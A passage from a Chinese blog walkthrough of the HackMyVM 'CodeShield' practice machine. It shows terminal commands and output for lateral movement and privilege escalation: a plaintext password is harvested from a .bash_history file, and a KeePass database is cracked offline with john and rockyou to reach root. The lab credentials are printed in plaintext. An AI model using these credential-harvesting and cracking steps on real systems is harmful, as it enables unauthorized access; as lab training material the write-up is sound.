drwxr-x---  <span class="token number">2</span> iredadmin iredadmin <span class="token number">4096</span> Aug <span class="token number">26</span>  <span class="token number">2023</span> iredadmin
drwxr-x---  <span class="token number">2</span> iredapd   iredapd   <span class="token number">4096</span> Aug <span class="token number">26</span>  <span class="token number">2023</span> iredapd
drwxr-x--- <span class="token number">16</span> mansourm  mansourm  <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> mansourm
drwxr-x--- <span class="token number">17</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">30</span>  <span class="token number">2023</span> mitchellt
drwxr-x---  <span class="token number">2</span> netdata   netdata   <span class="token number">4096</span> Aug <span class="token number">26</span>  <span class="token number">2023</span> netdata
drwxr-x--- <span class="token number">16</span> tanx      tanx      <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> tanx
drwxr-x--- <span class="token number">18</span> valdezk   valdezk   <span class="token number">4096</span> Aug <span class="token number">29</span>  <span class="token number">2023</span> valdezk
drwxr-x---  <span class="token number">2</span> vmail     vmail     <span class="token number">4096</span> Aug <span class="token number">26</span>  <span class="token number">2023</span> vmail
mitchellt@codeshield:/home$ <span class="token function">su</span> mitchellt
Password: 
mitchellt@codeshield:/home$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1006</span><span class="token punctuation">(</span>mitchellt<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1006</span><span class="token punctuation">(</span>mitchellt<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1006</span><span class="token punctuation">(</span>mitchellt<span class="token punctuation">)</span></code></pre>
<p>也是终于拿到了user flag,但是没有sudo</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">mitchellt@codeshield:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">112</span>
drwxr-x--- <span class="token number">17</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">30</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">14</span> root      root      <span class="token number">4096</span> Aug <span class="token number">26</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw-------  <span class="token number">1</span> mitchellt mitchellt  <span class="token number">209</span> Aug <span class="token number">30</span>  <span class="token number">2023</span> .bash_history
-rw-r--r--  <span class="token number">1</span> mitchellt mitchellt  <span class="token number">220</span> Aug <span class="token number">26</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r--  <span class="token number">1</span> mitchellt mitchellt <span class="token number">3771</span> Aug <span class="token number">26</span>  <span class="token number">2023</span> .bashrc
drwx------ <span class="token number">11</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> .cache
drwx------ <span class="token number">12</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">29</span>  <span class="token number">2023</span> .config
drwxr-xr-x  <span class="token number">2</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> Desktop
drwxr-xr-x  <span class="token number">2</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> Documents
drwxr-xr-x  <span class="token number">2</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> Downloads
-rw-------  <span class="token number">1</span> mitchellt mitchellt   <span class="token number">20</span> Aug <span class="token number">29</span>  <span class="token number">2023</span> .lesshst
drwx------  <span class="token number">3</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> .local
drwxrwxr-x  <span class="token number">6</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">30</span>  <span class="token number">2023</span> mining
drwx------  <span class="token number">3</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> .mozilla
drwxr-xr-x  <span class="token number">2</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> Music
drwxr-xr-x  <span class="token number">2</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> Pictures
-rw-r--r--  <span class="token number">1</span> mitchellt mitchellt  <span class="token number">807</span> Aug <span class="token number">26</span>  <span class="token number">2023</span> .profile
drwxr-xr-x  <span class="token number">2</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> Public
drwx------  <span class="token number">3</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">29</span>  <span class="token number">2023</span> snap
drwxr-xr-x  <span class="token number">2</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> Templates
drwx------  <span class="token number">6</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> .thunderbird
-rwxrwx---  <span class="token number">1</span> mitchellt mitchellt <span class="token number">2401</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> user.txt
-rw-r-----  <span class="token number">1</span> mitchellt mitchellt    <span class="token number">6</span> Aug <span class="token number">30</span>  <span class="token number">2023</span> .vboxclient-clipboard-tty2-control.pid
-rw-r-----  <span class="token number">1</span> mitchellt mitchellt    <span class="token number">6</span> Aug <span class="token number">30</span>  <span class="token number">2023</span> .vboxclient-draganddrop-tty2-control.pid
-rw-r-----  <span class="token number">1</span> mitchellt mitchellt    <span class="token number">6</span> Aug <span class="token number">30</span>  <span class="token number">2023</span> .vboxclient-hostversion-tty2-control.pid
-rw-r-----  <span class="token number">1</span> mitchellt mitchellt    <span class="token number">6</span> Aug <span class="token number">30</span>  <span class="token number">2023</span> .vboxclient-seamless-tty2-control.pid
-rw-r-----  <span class="token number">1</span> mitchellt mitchellt    <span class="token number">6</span> Aug <span class="token number">30</span>  <span class="token number">2023</span> .vboxclient-vmsvga-session-tty2-control.pid
drwxr-xr-x  <span class="token number">2</span> mitchellt mitchellt <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> Videos
mitchellt@codeshield:~$ <span class="token function">cat</span> user.txt 
             @@@                            
      @@@@@@@@@  @@@@@@                     
 @@@@@@@@@@@@@@          <span class="token punctuation">(</span>@@                
 @@@@@@@@@@@@@@           @@    ██████╗ ██████╗ ██████╗ ███████╗███████╗██╗  ██╗██╗███████╗██╗     ██████╗  
 @@@@@@@@@@@@@@           @@   ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗ 
  @@@@@@@@@@@@@          @@    ██║     ██║   ██║██║  ██║█████╗  ███████╗███████║██║█████╗  ██║     ██║  ██║ 
  @@@@@@@@@@@@@         @@@    ██║     ██║   ██║██║  ██║██╔══╝  ╚════██║██╔══██║██║██╔══╝  ██║     ██║  ██║ 
    @@@@@@@@@@@        @@      ╚██████╗╚██████╔╝██████╔╝███████╗███████║██║  ██║██║███████╗███████╗██████╔╝ 
     @@@@@@@@@@      @@@        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝  
        @@@@@@@   @@@                       
           @@@@@@@                          
</code></pre>
<p>在mitchellt的历史指令中找到了用户earlyp密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">mitchellt@codeshield:~$ <span class="token function">cat</span> .bash_history 
<span class="token builtin class-name">echo</span> <span class="token string">'EARL!YP7DeVel@OP'</span><span class="token operator">|</span> <span class="token function">su</span> - earlyp <span class="token parameter variable">-c</span> <span class="token string">"cp -r /home/earlyp/Development/mining ."</span>
<span class="token builtin class-name">echo</span> <span class="token string">'EARL!YP7DeVel@OP'</span><span class="token operator">|</span> <span class="token function">su</span> - earlyp <span class="token parameter variable">-c</span> <span class="token string">"cp -r /home/earlyp/Development/mining /tmp"</span>
<span class="token function">cp</span> <span class="token parameter variable">-r</span> /tmp/mining <span class="token builtin class-name">.</span>
<span class="token function">ls</span>
<span class="token builtin class-name">cd</span> mining/
<span class="token function">ls</span>
<span class="token builtin class-name">exit</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">mitchellt@codeshield:~$ <span class="token function">cat</span> .bash_history 
<span class="token builtin class-name">echo</span> <span class="token string">'EARL!YP7DeVel@OP'</span><span class="token operator">|</span> <span class="token function">su</span> - earlyp <span class="token parameter variable">-c</span> <span class="token string">"cp -r /home/earlyp/Development/mining ."</span>
<span class="token builtin class-name">echo</span> <span class="token string">'EARL!YP7DeVel@OP'</span><span class="token operator">|</span> <span class="token function">su</span> - earlyp <span class="token parameter variable">-c</span> <span class="token string">"cp -r /home/earlyp/Development/mining /tmp"</span>
<span class="token function">cp</span> <span class="token parameter variable">-r</span> /tmp/mining <span class="token builtin class-name">.</span>
<span class="token function">ls</span>
<span class="token builtin class-name">cd</span> mining/
<span class="token function">ls</span>
<span class="token builtin class-name">exit</span>
mitchellt@codeshield:~$ <span class="token function">su</span> earlyp
Password: 
earlyp@codeshield:/home/mitchellt$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>earlyp<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>earlyp<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>earlyp<span class="token punctuation">)</span>,4<span class="token punctuation">(</span>adm<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,30<span class="token punctuation">(</span>dip<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,110<span class="token punctuation">(</span>lxd<span class="token punctuation">)</span></code></pre>
<p>依然没有sudo<br>根据历史指令提示去到Development目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">earlyp@codeshield:~$ <span class="token function">cat</span> .bash_history 
<span class="token builtin class-name">cd</span> ~
<span class="token function">ls</span>
<span class="token builtin class-name">cd</span> Development/
<span class="token function">ls</span>
<span class="token builtin class-name">pwd</span>
<span class="token builtin class-name">exit</span></code></pre>
<p>然并卵，没什么有用东西</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">earlyp@codeshield:~/Development/mining$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">92</span>
drwxrwxr-x <span class="token number">6</span> earlyp earlyp <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxrwxr-x <span class="token number">3</span> earlyp earlyp <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp  <span class="token number">298</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> circle.yml
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp  <span class="token number">358</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> CONTRIBUTING.rst
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp   <span class="token number">46</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> .coveralls.yml
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp  <span class="token number">634</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> docker-compose.yml
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp  <span class="token number">938</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> Dockerfile
drwxrwxr-x <span class="token number">4</span> earlyp earlyp <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> docs
drwxrwxr-x <span class="token number">8</span> earlyp earlyp <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> .git
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp  <span class="token number">439</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> .gitignore
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp  <span class="token number">100</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> .gitmodules
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp <span class="token number">1081</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> LICENSE
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp  <span class="token number">794</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> Makefile
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp <span class="token number">3181</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> manage.py
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp  <span class="token number">161</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> MANIFEST.in
drwxrwxr-x <span class="token number">9</span> earlyp earlyp <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> mining
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp <span class="token number">3501</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> README.rst
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp   <span class="token number">34</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> requirements_dev.txt
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp  <span class="token number">261</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> requirements.txt
drwxrwxr-x <span class="token number">2</span> earlyp earlyp <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> scripts
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp  <span class="token number">230</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> setup.cfg
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp <span class="token number">2366</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> setup.py
-rw-rw-r-- <span class="token number">1</span> earlyp earlyp  <span class="token number">312</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> .travis.yml</code></pre>
<p>不过Document下面有个东西</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">earlyp@codeshield:~/Documents$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">12</span>
drwxr-xr-x  <span class="token number">2</span> earlyp earlyp <span class="token number">4096</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-x--- <span class="token number">19</span> earlyp earlyp <span class="token number">4096</span> Aug <span class="token number">29</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw-------  <span class="token number">1</span> earlyp earlyp <span class="token number">1918</span> Aug <span class="token number">28</span>  <span class="token number">2023</span> Passwords.kdbx</code></pre>
<p>根据搜索引擎知道kdbx是密码管理工具，里面有可能放了root的密码</p>
<h2 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h2><p>wget到kali上然后用john爆破<br>爆破花了好长时间最好爆出来kdbx管理密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># john passw.txt --wordlist=/usr/share/wordlists/rockyou.txt </span>
Using default input encoding: UTF-8
Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>KeePass <span class="token punctuation">[</span>SHA256 AES <span class="token number">32</span>/64<span class="token punctuation">]</span><span class="token punctuation">)</span>
Cost <span class="token number">1</span> <span class="token punctuation">(</span>iteration count<span class="token punctuation">)</span> is <span class="token number">3225806</span> <span class="token keyword">for</span> all loaded hashes
Cost <span class="token number">2</span> <span class="token punctuation">(</span>version<span class="token punctuation">)</span> is <span class="token number">2</span> <span class="token keyword">for</span> all loaded hashes
Cost <span class="token number">3</span> <span class="token punctuation">(</span>algorithm <span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">=</span>AES <span class="token assign-left variable">1</span><span class="token operator">=</span>TwoFish <span class="token assign-left variable">2</span><span class="token operator">=</span>ChaCha<span class="token punctuation">]</span><span class="token punctuation">)</span> is <span class="token number">0</span> <span class="token keyword">for</span> all loaded hashes
Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
mandalorian      <span class="token punctuation">(</span>Passwords<span class="token punctuation">)</span>  </code></pre>
<p>用keepassxc进去这个密码管理文件，果然有root的密码<br><img src="https://ooo.0x0.ooo/2024/04/17/OmXf3S.png" alt="OmXf3S.png" loading="lazy"><img src="https://ooo.0x0.ooo/2024/04/17/OmXjtC.png" alt="OmXjtC.png" loading="lazy"><br><code>root:7%z5,c9=w6[x8=</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">earlyp@codeshield:~/Documents$ <span class="token function">su</span> root
Password: 
root@codeshield:/home/earlyp/Documents<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
<p>成功拿到root权限</p>
</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://tao0845.github.io/posts/3e3f7c7d/" title="HackMyVM-CodeShield">https://tao0845.github.io/posts/3e3f7c7d/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/13e2841d/" rel="prev" title="HackMyVM-Inkplot"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">HackMyVM-Inkplot</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/b9be1174/" rel="next" title="HackMyVM-Observer"><span class="post-nav-text">HackMyVM-Observer</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>